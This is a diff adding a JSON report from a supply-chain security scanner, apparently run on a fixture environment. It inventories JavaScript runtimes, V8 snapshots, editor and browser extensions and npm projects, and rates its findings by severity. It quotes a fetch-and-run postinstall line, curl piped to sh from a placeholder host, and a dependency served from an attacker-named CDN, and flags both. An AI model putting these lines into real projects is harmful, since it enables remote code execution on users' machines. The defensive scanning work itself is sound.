@@ -1,0 +1,447 @@
+{
+ "meta": {
+  "tool": "underlight",
+  "version": "0.1.0",
+  "timestamp": "2026-09-19T20:25:53.111792+00:00",
+  "host": "vm",
+  "platform": "Linux 6.18.44-fc-v37 x86_64",
+  "python": "3.11.15",
+  "user": null,
+  "roots": [
+   "/Users/example"
+  ],
+  "deep": true,
+  "executed_anything": false,
+  "network_used": false,
+  "elapsed_s": 1.02
+ },
+ "runtimes": {
+  "installed": [
+   {
+    "path": "/usr/local/bin/bun",
+    "size": 19,
+    "mtime": "2026-09-19T20:24:39.122598+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "b0e23ab37d00649d2ad81d943fe5519617360f24793b42c2f4a2d6db1d637893",
+    "name": "bun",
+    "source": "PATH",
+    "invoked_as": "/usr/local/bin/bun"
+   },
+   {
+    "path": "/opt/node22/bin/node",
+    "size": 124679552,
+    "mtime": "2026-03-24T04:31:37+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "81925c0995b5c1427b5d538e6a90ca2fdc4daffb786b09af749beaf7369d4e90",
+    "name": "node",
+    "source": "known-location",
+    "invoked_as": "/usr/local/bin/node"
+   },
+   {
+    "path": "/root/.bun/bin/bun",
+    "size": 101814712,
+    "mtime": "2026-04-19T07:43:12+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "b29d78892abd5a9398e0700f0cb602f725089602ed1a5082d681c7257b2bf4d0",
+    "name": "bun",
+    "source": "known-location",
+    "invoked_as": "/usr/local/bin/bun"
+   }
+  ],
+  "embedded": [
+   {
+    "app": "/Users/example/opt/SomeChatApp",
+    "frameworks": [
+     "v8_context_snapshot.bin"
+    ],
+    "markers": {
+     "V8": [
+      "v8::internal::"
+     ],
+     "Bun": [
+      "Bun.serve"
+     ],
+     "Bun-section": [
+      "__BUN"
+     ]
+    },
+    "main_executable": "/Users/example/opt/SomeChatApp/SomeChatApp",
+    "engines": [
+     "Bun",
+     "V8"
+    ]
+   }
+  ],
+  "coverage": {
+   "visited": 14,
+   "hashed": 3,
+   "bytes_read": 227658557,
+   "skipped_permission": 0,
+   "skipped_size": 0,
+   "skipped_other": 0,
+   "capped": false,
+   "cap_reason": null,
+   "locations": [
+    "/opt",
+    "/usr/lib",
+    "/usr/local/lib",
+    "/usr/share",
+    "/Users/example/opt"
+   ],
+   "elapsed_s": 0.6
+  }
+ },
+ "heap_images": {
+  "images": [
+   {
+    "path": "/opt/pw-browsers/chromium_headless_shell-1194/chrome-linux/v8_context_snapshot.bin",
+    "size": 712401,
+    "mtime": "2026-05-08T16:30:04+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "67dfddf976d3f91d154b4d5fc83ece99050b58dcfeb1fc8e9cb2425ef0a00168",
+    "owning_app": "/opt/pw-browsers"
+   },
+   {
+    "path": "/opt/pw-browsers/chromium-1194/chrome-linux/v8_context_snapshot.bin",
+    "size": 712401,
+    "mtime": "2026-05-08T16:30:02+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "67dfddf976d3f91d154b4d5fc83ece99050b58dcfeb1fc8e9cb2425ef0a00168",
+    "owning_app": "/opt/pw-browsers"
+   },
+   {
+    "path": "/Users/example/opt/SomeChatApp/v8_context_snapshot.bin",
+    "size": 24,
+    "mtime": "2026-09-19T20:24:39.121414+00:00",
+    "user_writable": true,
+    "parent_user_writable": true,
+    "sha256": "b1d5f48799334a70b36174e047ad3ec82b9f500995f24dd0763cc49a580533e6",
+    "owning_app": "/Users/example/opt/SomeChatApp"
+   }
+  ],
+  "coverage": {
+   "visited": 130512,
+   "hashed": 3,
+   "bytes_read": 1424826,
+   "skipped_permission": 0,
+   "skipped_size": 0,
+   "skipped_other": 0,
+   "capped": false,
+   "cap_reason": null,
+   "locations": [
+    "/opt",
+    "/usr/lib",
+    "/usr/local/lib",
+    "/usr/share",
+    "/Users/example/opt",
+    "/usr/lib64",
+    "/snap",
+    "/var/lib/flatpak/app",
+    "/Users/example/.local/share/flatpak/app"
+   ],
+   "elapsed_s": 0.41
+  }
+ },
+ "editor_extensions": {
+  "extensions": [
+   {
+    "editor": "vscode",
+    "dir": "/Users/example/.vscode/extensions/nrwl.angular-console-18.0.0",
+    "id": "nrwl.angular-console",
+    "publisher": "nrwl",
+    "name": "angular-console",
+    "version": "18.0.0",
+    "display_name": "Nx Console",
+    "main": "./dist/main.js",
+    "main_sha256": "5ce0e7eb8753fe715d772732a952faa4a3753929afa5e01a0f21ca4160664820",
+    "main_size": 30,
+    "package_json_sha256": "f7273ef0414bafd326273928127d6144487b85c239aa2975f124567fc34f6fbb",
+    "dir_mtime": "2026-09-19T20:24:39.106598+00:00",
+    "activation_events": [
+     "*"
+    ],
+    "activates_always": true,
+    "contributes_keys": [
+     "commands"
+    ],
+    "extension_dependencies": [],
+    "has_node_modules": false,
+    "recent": true
+   }
+  ],
+  "coverage": {
+   "visited": 1,
+   "hashed": 2,
+   "bytes_read": 203,
+   "skipped_permission": 0,
+   "skipped_size": 0,
+   "skipped_other": 0,
+   "capped": false,
+   "cap_reason": null,
+   "locations": [
+    "/Users/example/.vscode/extensions"
+   ],
+   "elapsed_s": 0.0
+  }
+ },
+ "browser_extensions": {
+  "extensions": [
+   {
+    "browser": "brave",
+    "profile": "Default",
+    "id": "abcdefghijklmnopabcdefghijklmnop",
+    "version": "2.1.0",
+    "name": "Helpful Tab Thing",
+    "manifest_version": 3,
+    "dir": "/Users/example/.config/BraveSoftware/Brave-Browser/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/2.1.0_0",
+    "dir_mtime": "2026-09-19T20:24:39.110599+00:00",
+    "recent": true,
+    "permissions": [
+     "scripting",
+     "storage",
+     "webRequest"
+    ],
+    "host_permissions": [
+     "<all_urls>"
+    ],
+    "content_script_matches": [
+     "*://*/*"
+    ],
+    "content_script_count": 1,
+    "background": true,
+    "broad_host_access": true,
+    "powerful_permissions": [
+     "scripting",
+     "webRequest"
+    ],
+    "manifest_sha256": "4c068c8b8f52ecca5df264a75737ee636e0bb368c00b541a2dfba03e907fe543",
+    "update_url": "https://clients2.google.com/service/update2/crx",
+    "unpacked_or_sideloaded": false
+   }
+  ],
+  "coverage": {
+   "visited": 1,
+   "hashed": 1,
+   "bytes_read": 341,
+   "skipped_permission": 0,
+   "skipped_size": 0,
+   "skipped_other": 0,
+   "capped": false,
+   "cap_reason": null,
+   "locations": [
+    "/Users/example/.config/BraveSoftware/Brave-Browser"
+   ],
+   "elapsed_s": 0.0
+  }
+ },
+ "manifests": {
+  "projects": [
+   {
+    "dir": "/Users/example/code/webapp",
+    "name": "webapp",
+    "version": "1.0.0",
+    "private": true,
+    "direct_dependency_count": 4,
+    "url_deps": [
+     {
+      "field": "dependencies",
+      "name": "ui-kit",
+      "spec": "https://cdn.example-attacker.net/ui-kit-1.0.0.tgz"
+     },
+     {
+      "field": "devDependencies",
+      "name": "tool",
+      "spec": "github:someone/tool#v2"
+     }
+    ],
+    "lifecycle": {
+     "postinstall": {
+      "script": "node -e \"require('child_process').exec('curl -s https://x.example/i.sh|sh')\"",
+      "suspicious": true
+     }
+    },
+    "installed": [
+     {
+      "package": "left-pad",
+      "version": "1.3.0",
+      "dir": "/Users/example/code/webapp/node_modules/left-pad",
+      "direct": true,
+      "lifecycle": {
+       "prepare": {
+        "script": "echo hi",
+        "suspicious": false
+       }
+      },
+      "url_deps": [],
+      "has_binding_gyp": false
+     },
+     {
+      "package": "plain-crypto-js",
+      "version": "4.2.1",
+      "dir": "/Users/example/code/webapp/node_modules/plain-crypto-js",
+      "direct": false,
+      "lifecycle": {
+       "postinstall": {
+        "script": "node setup.js",
+        "suspicious": false
+       }
+      },
+      "url_deps": [],
+      "has_binding_gyp": false
+     }
+    ],
+    "installed_count": 4,
+    "off_registry": [
+     {
+      "lockfile": "package-lock.json",
+      "package": "node_modules/ui-kit",
+      "resolved": "https://cdn.example-attacker.net/ui-kit-1.0.0.tgz"
+     },
+     {
+      "lockfile": "package-lock.json",
+      "package": "node_modules/left-pad",
+      "resolved": "https://npm.internal.corp/left-pad/-/left-pad-1.3.0.tgz"
+     }
+    ],
+    "off_registry_hosts": {
+     "cdn.example-attacker.net": 1,
+     "npm.internal.corp": 1
+    }
+   }
+  ],
+  "coverage": {
+   "visited": 8,
+   "hashed": 0,
+   "bytes_read": 0,
+   "skipped_permission": 0,
+   "skipped_size": 0,
+   "skipped_other": 0,
+   "capped": false,
+   "cap_reason": null,
+   "locations": [
+    "/Users/example"
+   ],
+   "elapsed_s": 0.0
+  }
+ },
+ "findings": [
+  {
+   "severity": "high",
+   "kind": "url-valued-dependency",
+   "subject": "/Users/example/code/webapp :: tool",
+   "detail": "devDependencies specifier 'github:someone/tool#v2' resolves to a network location, not a registry. Registry scanners see zero dependencies (PhantomRaven pattern). The remote host can serve different content to different requesters."
+  },
+  {
+   "severity": "high",
+   "kind": "url-valued-dependency",
+   "subject": "/Users/example/code/webapp :: ui-kit",
+   "detail": "dependencies specifier 'https://cdn.example-attacker.net/ui-kit-1.0.0.tgz' resolves to a network location, not a registry. Registry scanners see zero dependencies (PhantomRaven pattern). The remote host can serve different content to different requesters."
+  },
+  {
+   "severity": "medium",
+   "kind": "embedded-bun-runtime",
+   "subject": "/Users/example/opt/SomeChatApp",
+   "detail": "Application binary carries Bun runtime markers. Bun has been used as a malware delivery runtime because endpoint tooling is tuned to node.exe (Malwarebytes, May 2026). Verify the publisher expects Bun here."
+  },
+  {
+   "severity": "medium",
+   "kind": "lockfile-off-registry",
+   "subject": "/Users/example/code/webapp",
+   "detail": "2+ resolutions point off public registries: cdn.example-attacker.net (1), npm.internal.corp (1). Legitimate for a private registry or git dependency; otherwise this is declaration drift."
+  },
+  {
+   "severity": "medium",
+   "kind": "project-lifecycle-suspicious",
+   "subject": "/Users/example/code/webapp :: scripts.postinstall",
+   "detail": "Lifecycle script matches network/exec/credential pattern: node -e \"require('child_process').exec('curl -s https://x.example/i.sh|sh')\""
+  },
+  {
+   "severity": "low",
+   "kind": "browser-extension-broad-and-powerful",
+   "subject": "brave/Default:abcdefghijklmnopabcdefghijklmnop (Helpful Tab Thing)",
+   "detail": "All-sites access plus scripting, webRequest. A capability, not an indicator; review whether the extension's function needs it."
+  },
+  {
+   "severity": "note",
+   "kind": "extension-activates-always",
+   "subject": "vscode:nrwl.angular-console",
+   "detail": "Activates on every editor start regardless of workspace."
+  },
+  {
+   "severity": "note",
+   "kind": "extension-recently-modified",
+   "subject": "vscode:nrwl.angular-console",
+   "detail": "Extension directory modified within 90 days (version 18.0.0)."
+  },
+  {
+   "severity": "note",
+   "kind": "heap-image-user-writable",
+   "subject": "/opt/pw-browsers/chromium-1194/chrome-linux/v8_context_snapshot.bin",
+   "detail": "V8 snapshot is modifiable without privilege elevation \u2014 the precondition for CVE-2025-55305 (built-in clobbering that survives code-signature checks). Normal on macOS/Windows defaults; the diff against your baseline is what turns this into a finding."
+  },
+  {
+   "severity": "note",
+   "kind": "heap-image-user-writable",
+   "subject": "/opt/pw-browsers/chromium_headless_shell-1194/chrome-linux/v8_context_snapshot.bin",
+   "detail": "V8 snapshot is modifiable without privilege elevation \u2014 the precondition for CVE-2025-55305 (built-in clobbering that survives code-signature checks). Normal on macOS/Windows defaults; the diff against your baseline is what turns this into a finding."
+  },
+  {
+   "severity": "note",
+   "kind": "heap-image-user-writable",
+   "subject": "/Users/example/opt/SomeChatApp/v8_context_snapshot.bin",
+   "detail": "V8 snapshot is modifiable without privilege elevation \u2014 the precondition for CVE-2025-55305 (built-in clobbering that survives code-signature checks). Normal on macOS/Windows defaults; the diff against your baseline is what turns this into a finding."
+  },
+  {
+   "severity": "note",
+   "kind": "installed-lifecycle-transitive",
+   "subject": "/Users/example/code/webapp :: node_modules/plain-crypto-js@4.2.1",
+   "detail": "Transitive dependency declares a postinstall script (no suspicious pattern matched)."
+  },
+  {
+   "severity": "note",
+   "kind": "user-writable-interpreter",
+   "subject": "/opt/node22/bin/node",
+   "detail": "Interpreter binary is writable by the current user; replaceable without elevation."
+  },
+  {
+   "severity": "note",
+   "kind": "user-writable-interpreter",
+   "subject": "/root/.bun/bin/bun",
+   "detail": "Interpreter binary is writable by the current user; replaceable without elevation."
+  }
+ ],
+ "summary": {
+  "runtimes_installed": 3,
+  "runtimes_embedded_apps": 1,
+  "runtimes_embedded_engines": [
+   "Bun",
+   "V8"
+  ],
+  "heap_images": 3,
+  "heap_images_user_writable": 3,
+  "editor_extensions": 1,
+  "editor_extensions_activate_always": 1,
+  "editor_extensions_recent": 1,
+  "browser_extensions": 1,
+  "browser_extensions_broad_host": 1,
+  "browser_extensions_broad_and_powerful": 1,
+  "projects": 1,
+  "installed_packages_inspected": 4,
+  "url_valued_dependencies": 2,
+  "installed_lifecycle_scripts": 2,
+  "installed_lifecycle_suspicious": 0,
+  "installed_lifecycle_transitive": 1,
+  "projects_with_off_registry_resolutions": 1,
+  "findings_by_severity": {
+   "high": 2,
+   "medium": 3,
+   "low": 1,
+   "note": 8
+  }
+ }
+}
